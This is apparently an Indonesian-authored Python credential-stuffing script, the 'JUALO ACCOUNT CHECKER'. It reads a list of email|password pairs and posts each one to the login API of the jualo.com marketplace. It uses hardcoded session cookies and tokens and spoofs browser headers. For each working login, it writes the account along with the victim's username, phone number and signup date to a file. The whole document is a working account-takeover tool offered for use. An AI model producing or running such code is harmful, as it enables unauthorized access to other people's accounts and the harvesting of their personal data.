#!/usr/bin/env python
# coding: utf-8
# Recode Mandul 7 turunan

from art import *
import requests, colorama, os, random, pyfiglet
from http import cookiejar
BLU = colorama.Style.BRIGHT + colorama.Fore.BLUE
CYA = colorama.Style.BRIGHT + colorama.Fore.CYAN
GRE = colorama.Style.BRIGHT + colorama.Fore.GREEN
YEL = colorama.Style.BRIGHT + colorama.Fore.YELLOW
RED = colorama.Style.BRIGHT + colorama.Fore.RED
MAG = colorama.Style.BRIGHT + colorama.Fore.MAGENTA
LIYEL = colorama.Style.BRIGHT + colorama.Fore.LIGHTYELLOW_EX
LIRED = colorama.Style.BRIGHT + colorama.Fore.LIGHTRED_EX
LIMAG = colorama.Style.BRIGHT + colorama.Fore.LIGHTMAGENTA_EX
LIBLU = colorama.Style.BRIGHT + colorama.Fore.LIGHTBLUE_EX
LICYA = colorama.Style.BRIGHT + colorama.Fore.LIGHTCYAN_EX
LIGRE = colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX
BOLD = colorama.Style.BRIGHT
RESET = colorama.Fore.RESET
CLEAR = 'cls' if os.name == 'nt' else 'clear'
COLORS = BLU, CYA, GRE, YEL, RED, MAG, LIYEL, LIRED, LIMAG, LIBLU, LICYA, LIGRE
FONTS = 'basic', 'o8', 'cosmic', 'graffiti', 'chunky', 'epic', 'doom', 'avatar', 'this',
font = random.choice(FONTS)
colorama.init(autoreset=True)
color2 = random.choice(COLORS)

class BlockCookies(cookiejar.CookiePolicy):
    return_ok = set_ok = domain_return_ok = path_return_ok = lambda self, *args, **kwargs: False
    netscape = True
    rfc2965 = hide_cookie2 = False
r = requests.Session()
r.cookies.set_policy(BlockCookies()) 

def logo() -> None:
    os.system(CLEAR)
    color1 = random.choice(COLORS)
    color2 = random.choice(COLORS)
    while color1 == color2:
        color2 = random.choice(COLORS)
    print(color1 + '_' * os.get_terminal_size().columns, end='\n'*2)
    print(color2 + pyfiglet.figlet_format('JUALO ACCOUNT CHECKER', font=font, justify='center', width=os.get_terminal_size().columns), end='')
    msg = '[Author RH DYAR AP]'
    _ = int(os.get_terminal_size().columns/2)
    _ -= int(len(msg)/2)
    print(color1 + '=' * _ + LIYEL + msg + color1 + '=' * _ + '\n')
logo()


d = input(f'{random.choice(COLORS)}                         Input List > ')
devices = open(d, 'r+',  encoding="utf-8").read().splitlines()
try:
    for list in devices:
        pisah = list.strip()
        empas = list.split('|')

        usr = empas[0]
        pas = empas[1]
        account = usr+'|'+pas
        cookies = {
            '_ga': 'GA1.2.1718086823.1665022011',
            '_gid': 'GA1.2.2133739134.1665022011',
            '__gads': 'ID=8c2c91d83ce2c49f-2293152adfd600e5:T=1665022011:RT=1665022011:S=ALNI_MY5lAWker8nS3TyKmoI4ceylYRCXA',
            '__gpi': 'UID=00000a1d6f17058c:T=1665022011:RT=1665022011:S=ALNI_MYZXlroVkagr0MwxAMIDoMsk9uOZw',
            '_gat': '1',
            'osg_subscribed': '',
            'sso_user_id': '5623806',
            'sso_callback': 'https%3A%2F%2Fwww.jualo.com%2Fprofile',
            'non_bouncing_user': '1',
            'XSRF-TOKEN': 'sR2E1TNyVrdwMCnZ1Z3kzoT24Fu5qP9bKTYzpKzNm%2BfPxeOsJIqBlsRPzNnCZsFyrPbN%2FjOGHnOGT42szlqCGQ%3D%3D',
            '_j': 'ZGNUWXc1RG9iRlVVQU9Ga1JySEsvbldmZkpRV09yUldGYTJvWGFCZkNUK3lhdnB1aytweWJhUCtHc2xxMVQyL1FMVko1ZE1nZitUbzloekJESWpEdVBzR0ZhUGozdUpLY25zdWJnY2pEVTM3R0FCTVJ0akx2Vm9OWHQ4MTlJcGh4MW9XWlRVU05MTnF5UFJYNC9yYU9UalIrNFM0RVI2VENmcFRVbElHYVl5OEIwKzRCYUNnY3Vwb05tN1YvTVlTYXd0R0lzdWFUTDYya3BsTU8wZDJXYTUwSTJWVVRDV3paaDBHQXp2VDgyND0tLUI1TG9tRmYxa0t3QnFiYUNaUVJhSmc9PQ%3D%3D--5600566830a0cd947ae9c17549f6ff233c0a9e47',
            'AWSALB': 'FkEZDva1IjNtI2DvVzThvubNGII4XMcRg7x7VIBIaZj5PP32oU4leuCgVZi6bptgFgXTlI52zvii68PdSutLYfv49h/BZmTXfkfzZQIuSUC0cRQ1F4kYBRMIvvrM7eWqY8aHHBiPgCqcfHqiEVQ0EU5j85wTyWcvR9kLPYV6s0JgFihnceMXKhV+FCyLdw==',
            'AWSALBCORS': 'FkEZDva1IjNtI2DvVzThvubNGII4XMcRg7x7VIBIaZj5PP32oU4leuCgVZi6bptgFgXTlI52zvii68PdSutLYfv49h/BZmTXfkfzZQIuSUC0cRQ1F4kYBRMIvvrM7eWqY8aHHBiPgCqcfHqiEVQ0EU5j85wTyWcvR9kLPYV6s0JgFihnceMXKhV+FCyLdw==',
        }

        headers = {
            'authority': 'www.jualo.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            # Already added when you pass json=
            # 'content-type': 'application/json',
            # Requests sorts cookies= alphabetically
            # 'cookie': '_ga=GA1.2.1718086823.1665022011; _gid=GA1.2.2133739134.1665022011; __gads=ID=8c2c91d83ce2c49f-2293152adfd600e5:T=1665022011:RT=1665022011:S=ALNI_MY5lAWker8nS3TyKmoI4ceylYRCXA; __gpi=UID=00000a1d6f17058c:T=1665022011:RT=1665022011:S=ALNI_MYZXlroVkagr0MwxAMIDoMsk9uOZw; _gat=1; osg_subscribed=; sso_user_id=5623806; sso_callback=https%3A%2F%2Fwww.jualo.com%2Fprofile; non_bouncing_user=1; XSRF-TOKEN=sR2E1TNyVrdwMCnZ1Z3kzoT24Fu5qP9bKTYzpKzNm%2BfPxeOsJIqBlsRPzNnCZsFyrPbN%2FjOGHnOGT42szlqCGQ%3D%3D; _j=ZGNUWXc1RG9iRlVVQU9Ga1JySEsvbldmZkpRV09yUldGYTJvWGFCZkNUK3lhdnB1aytweWJhUCtHc2xxMVQyL1FMVko1ZE1nZitUbzloekJESWpEdVBzR0ZhUGozdUpLY25zdWJnY2pEVTM3R0FCTVJ0akx2Vm9OWHQ4MTlJcGh4MW9XWlRVU05MTnF5UFJYNC9yYU9UalIrNFM0RVI2VENmcFRVbElHYVl5OEIwKzRCYUNnY3Vwb05tN1YvTVlTYXd0R0lzdWFUTDYya3BsTU8wZDJXYTUwSTJWVVRDV3paaDBHQXp2VDgyND0tLUI1TG9tRmYxa0t3QnFiYUNaUVJhSmc9PQ%3D%3D--5600566830a0cd947ae9c17549f6ff233c0a9e47; AWSALB=FkEZDva1IjNtI2DvVzThvubNGII4XMcRg7x7VIBIaZj5PP32oU4leuCgVZi6bptgFgXTlI52zvii68PdSutLYfv49h/BZmTXfkfzZQIuSUC0cRQ1F4kYBRMIvvrM7eWqY8aHHBiPgCqcfHqiEVQ0EU5j85wTyWcvR9kLPYV6s0JgFihnceMXKhV+FCyLdw==; AWSALBCORS=FkEZDva1IjNtI2DvVzThvubNGII4XMcRg7x7VIBIaZj5PP32oU4leuCgVZi6bptgFgXTlI52zvii68PdSutLYfv49h/BZmTXfkfzZQIuSUC0cRQ1F4kYBRMIvvrM7eWqY8aHHBiPgCqcfHqiEVQ0EU5j85wTyWcvR9kLPYV6s0JgFihnceMXKhV+FCyLdw==',
            'origin': 'https://www.jualo.com',
            'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
        }

        json_data = {
            'user': {
                'email': usr,
                'password': pas,
            },
        }

        response = requests.post('https://www.jualo.com/api/v2/users/login', cookies=cookies, headers=headers, json=json_data).json()
    
        if response['status'] == 'success':
            data = response['data']['current_user']
            nama = data['slug']
            phone = data['phone_text']
            acc = data['signup_at']
            print(f'{GRE}[+]SUKSES LOGIN =>{account} {LIYEL}[ Username: {nama} Phone: {phone} ] signup_at: {acc}'.center(os.get_terminal_size().columns))  
            open('validAcc-jualo.txt', "a+").write(f'{str(account)} username: {str(nama)} Phone: {str(phone)} signup_at: {str(acc)}\n')      

        else:
            print(f'{RED}[-]GAGAL LOGIN =>{account}'.center(os.get_terminal_size().columns))  
except KeyboardInterrupt:
        print(f"{BOLD}Oh! you pressed CTRL + C.".center(os.get_terminal_size().columns))
        print(f"{BOLD}Proses Di hentikan :) ".center(os.get_terminal_size().columns))
